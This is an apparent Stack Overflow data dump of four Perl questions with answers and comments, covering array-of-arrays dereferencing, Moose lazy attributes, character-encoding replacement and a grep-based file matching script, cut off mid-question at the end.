[{"tags": ["arrays", "json", "perl", "multidimensional-array"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1463007926, "post_id": 37174614, "comment_id": 61883974, "body": "What do you want the arguments to <code>Dive</code> to be when you call <code>GetAnalyticsDataInHash($json,&#39;name&#39;,&#39;value,UveVirtualMachine&zwnj;&#8203;Agent,vm_name&#39;)</code>?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1463008031, "post_id": 37174614, "comment_id": 61884006, "body": "There&#39;s no way <code>@AllArgumentsArray</code> contains what you say it does."}], "answers": [{"tags": [], "owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "is_accepted": false, "score": 0, "last_activity_date": 1463008402, "creation_date": 1463008402, "answer_id": 37174755, "question_id": 37174614, "link": "https://stackoverflow.com/questions/37174614/perl-pass-one-of-the-array-in-array-of-arrays-to-a-subroutine/37174755#37174755", "title": "Perl Pass one of the Array in &#39;Array of Arrays&#39; to a subroutine", "body": "<p>The way to dereference the AOA and send it to Dive is </p>\n\n<pre><code>print Dive($_, @{$AllArgumentsArray[0]});\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 927, "user_id": 5403907, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/F3lnS.jpg?s=128&g=1", "display_name": "mbethke", "link": "https://stackoverflow.com/users/5403907/mbethke"}, "is_accepted": false, "score": 0, "last_activity_date": 1463020897, "creation_date": 1463020897, "answer_id": 37176365, "question_id": 37174614, "link": "https://stackoverflow.com/questions/37174614/perl-pass-one-of-the-array-in-array-of-arrays-to-a-subroutine/37176365#37176365", "title": "Perl Pass one of the Array in &#39;Array of Arrays&#39; to a subroutine", "body": "<p><code>GetAnalyticsData</code> looks like it is supposed to accept any number of arguments of the \"comma-separated path of hash keys\" kind like <code>'value,UveVirtualMachineAgent,vm_name'</code>. So either you have to pass all of these to <code>Dive()</code> e.g. using an arrayref:</p>\n\n<pre><code>Dive($decoded_json, \\@AllArgumentsArray);\n</code></pre>\n\n<p>or you loop over them and pass them to Dive one by one. Then you could just do it within the loop you have anyway and that could be more clearly written like this:</p>\n\n<pre><code>sub GetAnalyticsDataInHash{\n    my $decoded_json = shift;\n    for my $path (@_) {\n        Dive($decoded_json, [ split /,/, $path ]);\n    }\n}\n</code></pre>\n\n<p>Of course you'll probably want to do smething with <code>Dive()</code>'s result but I can't tell without seeing this function.</p>\n"}], "owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 61, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1463020897, "creation_date": 1463007436, "question_id": 37174614, "link": "https://stackoverflow.com/questions/37174614/perl-pass-one-of-the-array-in-array-of-arrays-to-a-subroutine", "title": "Perl Pass one of the Array in &#39;Array of Arrays&#39; to a subroutine", "body": "<p>I am parsing a JSON file and I have one array of arrays @AllArgumentsArray .. The array withing this AOA are the sections of JSON through which I will traverse. A sample JSON is:</p>\n\n<pre><code>{\nname: \"myThing\",\n    value: {\n    UveVirtualMachineAgent: {\n        vm_name: \"TuttyFruity\"\n        }\n    }\n},\n</code></pre>\n\n<p>Now the function I am writing will get many arguments like </p>\n\n<pre><code>&amp;GetAnalyticsDataInHash($json,'name','value,UveVirtualMachineAgent,vm_name');\n\nsub GetAnalyticsDataInHash{\n    my @AllArgumentsArray;  #The rest of the arguments in an array\n    my $decoded_json = $_[0];\n    for (my $i=1;$i&lt;=$#_;$i++){\n        push @AllArgumentsArray, [ split /,/, $_[$i] ]; #split them and make array of arrays ..\n    }\n\n    print Dive($decoded_json, @AllArgumentsArray[0]), \"\\n\";\n}\n</code></pre>\n\n<p>The DumperShows that arrays are there in AOA .. but i am not sure how to pass a full array in Dive Function?</p>\n\n<pre><code>DB&lt;5&gt; p Dumper @AllArgumentsArray\n  $VAR1 = [\n            'value',\n            'UveVirtualMachineAgent',\n            'vm_name'\n          ];\n  $VAR2 = [\n            'value',\n            'get',\n            'this'\n          ];\n</code></pre>\n"}, {"tags": ["perl", "moose"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1463020940, "post_id": 37174535, "comment_id": 61887239, "body": "This is obviously not the code you ran..."}, {"owner": {"reputation": 927, "user_id": 5403907, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/F3lnS.jpg?s=128&g=1", "display_name": "mbethke", "link": "https://stackoverflow.com/users/5403907/mbethke"}, "edited": false, "score": 1, "creation_date": 1463021325, "post_id": 37174535, "comment_id": 61887337, "body": "I don&#39;t see how this could possibly work even sometimes unless you omitted some method <code>config</code> that acceses <code>$self-&gt;configfile</code>. I think there&#39;s a simple typo in <code>_build_configuration()</code>: <code>unless ( $self-&gt;config )</code> should be <code>unless ( $self-&gt;configfile )</code>. Other than that, the <code>required</code> on <code>conf</code> is superfluous as it is lazy anyway, but it doesn&#39;t hurt either."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 927, "user_id": 5403907, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/F3lnS.jpg?s=128&g=1", "display_name": "mbethke", "link": "https://stackoverflow.com/users/5403907/mbethke"}, "edited": false, "score": 1, "creation_date": 1463047226, "post_id": 37174535, "comment_id": 61900171, "body": "There is also the <code>sub baz</code> vs the auto-generated accessor for the property <code>baz</code>, and the absence of <code>sub _build_baz</code>. I agree with @mbethke. This code is not what you ran. Please don&#39;t write fresh code in here. <a href=\"https://stackoverflow.com/posts/37174535/edit\">Edit</a> your question and show your <b>real</b> code, or we cannot help."}, {"owner": {"reputation": 564, "user_id": 158575, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/50c5f04c098fa8e109cbccc2d116a4d5?s=128&d=identicon&r=PG", "display_name": "Todd", "link": "https://stackoverflow.com/users/158575/todd"}, "edited": false, "score": 0, "creation_date": 1463067563, "post_id": 37174535, "comment_id": 61915685, "body": "Extracted from real code that runs (except for the aforementioned problem), but unfortunately unable to post it for reasons I am unable to go into here.  Sorry I tried to simplify it down to where I believe the problem lies.  The crux of the problem is the same.  I will post a working version of above shortly."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463068406, "post_id": 37174535, "comment_id": 61916328, "body": "It&#39;s fine to reduce your code (actually, it&#39;s encouraged!), but please make it into a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> that actually runs before posting."}], "answers": [{"tags": [], "owner": {"reputation": 564, "user_id": 158575, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/50c5f04c098fa8e109cbccc2d116a4d5?s=128&d=identicon&r=PG", "display_name": "Todd", "link": "https://stackoverflow.com/users/158575/todd"}, "is_accepted": false, "score": 0, "last_activity_date": 1463072434, "creation_date": 1463072434, "answer_id": 37193186, "question_id": 37174535, "link": "https://stackoverflow.com/questions/37174535/moose-attribute-set-order-difficulty/37193186#37193186", "title": "Moose attribute set order difficulty", "body": "<p>Thanks for the help everyone.  I ran the real code line by line through the debugger and found that there was one attribute buried in a subclass that didn't have lazy=>1.   </p>\n"}], "owner": {"reputation": 564, "user_id": 158575, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/50c5f04c098fa8e109cbccc2d116a4d5?s=128&d=identicon&r=PG", "display_name": "Todd", "link": "https://stackoverflow.com/users/158575/todd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 74, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463072434, "creation_date": 1463007029, "last_edit_date": 1463070159, "question_id": 37174535, "link": "https://stackoverflow.com/questions/37174535/moose-attribute-set-order-difficulty", "title": "Moose attribute set order difficulty", "body": "<p>I'm having difficulty with attribute initialization order in the following:</p>\n\n<p>driver.pl</p>\n\n<pre><code>my $foo = MyApp::Boom-&gt;new( configfile =&gt; \"/home/todd/text.cfg\" );\n</code></pre>\n\n<p>MyApp::Boom</p>\n\n<pre><code>has configfile =&gt; (\n    is    =&gt; 'ro', isa =&gt; 'Str', required =&gt; 1\n);\n\nhas conf =&gt; (\n    is =&gt; 'ro', isa =&gt; 'HashRef', required =&gt; 1, lazy =&gt; 1,\n    builder =&gt; '_build_configuration'\n);\n\nsub _build_configuration {\n    my $self = shift;\n\n    unless ( $self-&gt;configfile ) {\n        die \"No Configuration File!\";\n    }\n    # stuff that reads the file and creates a hashref\n    return $href;\n}\n\nhas baz =&gt; (\n    is =&gt; 'ro', isa =&gt; 'MyApp::Baz', required =&gt; 1, lazy =&gt; 1,\n    builder =&gt; '_build_baz',\n);\n\nsub _build_baz {\n    my $self = shift;\n    my $conf = $self-&gt;conf;\n    # uses data in conf to do stuff and create a MyApp::Baz\n    return MyApp::Baz-&gt;new($conf);\n}\n\n# other stuff omitted....\n</code></pre>\n\n<p>When I run the driver.pl, I sometimes get an error message \"No Configuration File\" and sometimes it works.  I'm obviously missing something important about 'lazy' and 'required', but can't figure it out.</p>\n\n<p>My understanding is the \"configfile\" would be set by the new call in driver.pl and the the attributes would initialize when called elsewhere and presumably 'configfile' would already be set.    </p>\n\n<p>Pointers, recommendations, or alternative approaches are welcome. </p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463003772, "post_id": 37173903, "comment_id": 61882527, "body": "Are you saying that people are entering non-ISO 8859-1 characters into your HTML form and you need your Perl backend to convert <code>&#226;\u20ac\u2122</code> to <code>&#39;</code> in the request parameters that it receives?"}, {"owner": {"reputation": 329, "user_id": 5927716, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/70bfdd9b7d85dd80bdc22bee3d1c84d1?s=128&d=identicon&r=PG&f=1", "display_name": "slicks1", "link": "https://stackoverflow.com/users/5927716/slicks1"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463003833, "post_id": 37173903, "comment_id": 61882554, "body": "@ThisSuitIsBlackNot updated question"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463003902, "post_id": 37173903, "comment_id": 61882587, "body": "Your update doesn&#39;t answer my question..."}, {"owner": {"reputation": 329, "user_id": 5927716, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/70bfdd9b7d85dd80bdc22bee3d1c84d1?s=128&d=identicon&r=PG&f=1", "display_name": "slicks1", "link": "https://stackoverflow.com/users/5927716/slicks1"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463003991, "post_id": 37173903, "comment_id": 61882614, "body": "@ThisSuitIsBlackNot I dont know if the characters are deemed non-ISO 8859-1 characters but they are submitting characters like I explained and I need to convert them. I imagine theres an array of these type of characters"}, {"owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 0, "creation_date": 1463004065, "post_id": 37173903, "comment_id": 61882650, "body": "Why are you using a legacy encoding like ISO-8859-1? UTF-8 has been well supported since around the turn of the century."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463004127, "post_id": 37173903, "comment_id": 61882678, "body": "Convert them <i>where</i>? A CGI script?"}, {"owner": {"reputation": 329, "user_id": 5927716, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/70bfdd9b7d85dd80bdc22bee3d1c84d1?s=128&d=identicon&r=PG&f=1", "display_name": "slicks1", "link": "https://stackoverflow.com/users/5927716/slicks1"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463004157, "post_id": 37173903, "comment_id": 61882687, "body": "@ThisSuitIsBlackNot In my perl code"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1463004740, "post_id": 37173903, "comment_id": 61882933, "body": "Why don&#39;t you just change the encoding to UTF-8 in your browser?"}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "edited": false, "score": 0, "creation_date": 1463005967, "post_id": 37173903, "comment_id": 61883376, "body": "iirc, browsers do not necessarily obey the charset/encoding requested in a <code>meta</code> tag, at least server-generated http headers have precedence here. Also note that rendering a web page in a given charset does not prevent users from entering data in a different encoding in form fields and submitting them to the server. However, most important, what prevents you from consistently working with utf-8 in the first place?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1463007704, "post_id": 37173903, "comment_id": 61883902, "body": "Please provide a minimal runnable demonstration of the problem."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1463044851, "post_id": 37173903, "comment_id": 61898301, "body": "Note that <code>&#226;\u20ac\u2122</code> is the <i>Windows-1252</i> decoding of the <i>UTF-8</i> encoding of Unicode character <code>U+2019</code>. Windows-1252 is similar to ISO-8859-1 but sixteen of the code points are different. You probably want <code>charset=&quot;windows-1252&quot;</code> in your <code>&lt;meta&gt;</code> element"}], "answers": [{"comments": [{"owner": {"reputation": 6468, "user_id": 293652, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/820308d5db420d7f0e1d0ba97e09f520?s=128&d=identicon&r=PG", "display_name": "Grant McLean", "link": "https://stackoverflow.com/users/293652/grant-mclean"}, "edited": false, "score": 0, "creation_date": 1463014767, "post_id": 37174748, "comment_id": 61885711, "body": "<a href=\"https://metacpan.org/pod/Encoding::FixLatin\" rel=\"nofollow noreferrer\">Encoding::FixLatin</a> could be used to take mixed latin1/cp1252/utf8 data and convert it to utf8 in Perl.  I&#39;d recommend simply changing the output encoding to utf8, but if that&#39;s not an option then regexes like @mob&#39;s above could be used to restrict the output to latin1 or even ASCII."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1463014828, "post_id": 37174748, "comment_id": 61885725, "body": "@mob, If he&#39;s starting with text and if he&#39;s generating HTML, then he should be using <code>encode_entities</code>, not <code>s&#47;\\x{2019}&#47;&#39;&#47;g</code>."}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 2, "last_activity_date": 1463011836, "last_edit_date": 1463011836, "creation_date": 1463008364, "answer_id": 37174748, "question_id": 37173903, "link": "https://stackoverflow.com/questions/37173903/replace-%c3%a2%e2%82%ac-in-perl/37174748#37174748", "title": "Replace &#226;\u20ac\u2122 in perl", "body": "<p><code>\u00e2\u20ac\u2122</code> is <code>0xE2 0x80 0x99</code> in the <a href=\"https://en.wikipedia.org/wiki/Windows-1252\" rel=\"nofollow\">cp1252 encoding</a>, and <code>0xE2 0x80 0x99</code> is the UTF-8 encoding of the <code>U+2019 RIGHT SINGLE QUOTATION MARK</code> character.</p>\n\n<p>The right single quotation mark is not a valid character in character set iso-8859-1, so somehow you will have to prevent this character from getting sent to the page output. Here are two ways:</p>\n\n<ol>\n<li><p>Convert it to a printable character (like <code>0x27</code>, the apostrophe)</p>\n\n<pre><code>$output =~ s/\\x{2019}/'/g;\nprint $output;\n</code></pre></li>\n<li><p>Rewrite it as an <a href=\"https://www.w3.org/wiki/Common_HTML_entities_used_for_typography\" rel=\"nofollow\">HTML entity</a>, which should work no matter what the page encoding is</p>\n\n<pre><code>$output =~ s/\\x{2019}/&amp;rsquo;/g;\nprint $output;\n</code></pre></li>\n</ol>\n\n<p>Quite possibly <code>\\x{2019}</code> is not the only unprintable character in your raw output that you need to be concerned about (and even printable characters like <code>&lt;</code> and <code>&amp;</code> need to be encoded), and so <a href=\"https://metacpan.org/search?q=HTML+entities&amp;search_type=modules\" rel=\"nofollow\">a module</a> that has already solved this problem is called for. At this time I can not be sure that any particular module will solve your problem, so I will refrain from recommending one.</p>\n"}], "owner": {"reputation": 329, "user_id": 5927716, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/70bfdd9b7d85dd80bdc22bee3d1c84d1?s=128&d=identicon&r=PG&f=1", "display_name": "slicks1", "link": "https://stackoverflow.com/users/5927716/slicks1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 784, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1463011836, "creation_date": 1463003515, "last_edit_date": 1463003808, "question_id": 37173903, "link": "https://stackoverflow.com/questions/37173903/replace-%c3%a2%e2%82%ac-in-perl", "title": "Replace &#226;\u20ac\u2122 in perl", "body": "<p>I'm fairly new to Perl and I need to replace characters like <code>\u00e2\u20ac\u2122</code> with <code>'</code> (i imagine there are more)</p>\n\n<p>I am NOT using <code>UTF-8</code> as my <code>page rendering content type</code> but <code>&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"&gt;</code></p>\n\n<p>I understand I have no code samples to show but how do I accomplish this?</p>\n"}, {"tags": ["perl", "grep"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1463002758, "post_id": 37173493, "comment_id": 61882107, "body": "If it were a syntax error, you&#39;d get an error message when you attempt to run the program telling you that there&#39;s a syntax error. So, it&#39;s not a syntax error. You probably have a logic error, which is more difficult to detect."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1463002813, "post_id": 37173493, "comment_id": 61882131, "body": "Why is the pipe escaped in your regex? I don&#39;t see any pipe characters in either of your sample input files."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1463002957, "post_id": 37173493, "comment_id": 61882191, "body": "What are the approximate sizes of each file?"}, {"owner": {"reputation": 3, "user_id": 6302304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9251571f448d111ac9889cfab9510abb?s=128&d=identicon&r=PG&f=1", "display_name": "S. Gram", "link": "https://stackoverflow.com/users/6302304/s-gram"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1463002998, "post_id": 37173493, "comment_id": 61882214, "body": "I should prob get rid of it, someone else told me to do that and @MattJacob you&#39;re right it&#39;s a logic error, sorry, but the the pipe didn&#39;t really fix it"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1463004082, "post_id": 37173493, "comment_id": 61882657, "body": "update your code to match what you are trying now.  the grep regex only very vaguely looks like your input (but not enough to actually match).  Please also do answer the question about approximate sizes of each file."}, {"owner": {"reputation": 3, "user_id": 6302304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9251571f448d111ac9889cfab9510abb?s=128&d=identicon&r=PG&f=1", "display_name": "S. Gram", "link": "https://stackoverflow.com/users/6302304/s-gram"}, "edited": false, "score": 0, "creation_date": 1463004493, "post_id": 37173493, "comment_id": 61882832, "body": "about 20,000 lines for the input and 60,000 lines for the text file"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1463006245, "post_id": 37173493, "comment_id": 61883476, "body": "@MattJacob: I suggested escaping the pipe in a comment on the OP&#39;s preceding question. That was before he showed any data, but his data does have pipes in earlier questions. Many people have tried hard to help this guy and failed"}, {"owner": {"reputation": 3, "user_id": 6302304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9251571f448d111ac9889cfab9510abb?s=128&d=identicon&r=PG&f=1", "display_name": "S. Gram", "link": "https://stackoverflow.com/users/6302304/s-gram"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1463006921, "post_id": 37173493, "comment_id": 61883684, "body": "@Borodin No they did help! This is just after adjustments have been made and  other things are going wonky."}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 6302304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9251571f448d111ac9889cfab9510abb?s=128&d=identicon&r=PG&f=1", "display_name": "S. Gram", "link": "https://stackoverflow.com/users/6302304/s-gram"}, "edited": false, "score": 1, "creation_date": 1463007913, "post_id": 37174624, "comment_id": 61883969, "body": "Thank-you So much!"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 2, "last_activity_date": 1467562886, "last_edit_date": 1467562886, "creation_date": 1463007483, "answer_id": 37174624, "question_id": 37173493, "link": "https://stackoverflow.com/questions/37173493/perl-correct-input-grep/37174624#37174624", "title": "perl, &lt;Correct Input, grep", "body": "<p>I <em>think</em> what you're looking for is this, but it's really very hard to tell because you have described your problem so poorly</p>\n\n<p>I've had to make a lot of assumptions, but at least the output matches what you say you're expecting</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\n\nmy $data_file = 'text.txt';\n\nmy @data;\n{\n    open my $fh, '&lt;', $data_file or die qq{Unable to open \"$data_file\" for input: $1};\n    while ( &lt;$fh&gt; ) {\n        next unless /\\S/;\n        push @data, [ split ];\n    }\n}\n\nwhile ( &lt;&gt; ) {\n    next unless /\\S/;\n\n    my ($name, $number, $expression) = split;\n\n    for my $item ( @data ) {\n\n        my ($what, $start, $stop, $chr, $who) = @$item;\n\n        if ( $what eq $name or defined $who and $who eq $expression ) {\n            print join(\"\\t\", $name, $number, $expression, $chr, $start, $stop), \"\\n\";\n        }\n    }\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>A1B 1   68  21  30214006    30216073\nA1C 299 0   Y   20808776    20811809\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 6302304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9251571f448d111ac9889cfab9510abb?s=128&d=identicon&r=PG&f=1", "display_name": "S. Gram", "link": "https://stackoverflow.com/users/6302304/s-gram"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 37174624, "answer_count": 1, "score": -1, "last_activity_date": 1467562886, "creation_date": 1463001678, "last_edit_date": 1463003064, "question_id": 37173493, "link": "https://stackoverflow.com/questions/37173493/perl-correct-input-grep", "title": "perl, &lt;Correct Input, grep", "body": "<p>Please don't comment to say I already asked this, It's a logic question, I know it's mostly similar code but there are underlying syntax problems that I cannot decipher and have spent hours debugging this with no hope and I just really need this answered. And that other account was deleted so I did post this half an hour ago but can't view it. Please only comment if you want to help.</p>\n\n<p>It should work everything is in data and it should be turning up results, i've had it working before so it must just be so syntax thing I'm not noticing. I can't get this work. I'm almost certain it's the grep statement.</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nopen (\"data\", \"&lt;text.txt\") or die \"Can't open\";        #\n        my @data = &lt;data&gt;;              #file looking into\n        close \"data\";           #\nwhile(&lt;&gt;){\n        chomp;\n        my $temp = $_;\n        my ($name, $number, $expression) = split(\"\\t\", $temp);\n        my $pattern = \"\\t\";\n        my @found = grep ( /(^$name$pattern\\|$pattern$number$)/, @data );\n        if(defined($found[0])){\n                print $_;\n                my ($what, $start, $stop, $chr, $who) = split(\"\\t\", $found[0]);\n                print \"\\t\", $chr, $start, $stop;\n                @found = ();\n        }\n}\nprint \"\\n\";\n</code></pre>\n\n<p>Input is of the format</p>\n\n<pre><code>A1B 1   68\n\nA1C 299 0\n\nA2B 547 0\n\nA2L 877 30\n\nA2M 2   7944\n</code></pre>\n\n<p>And this is 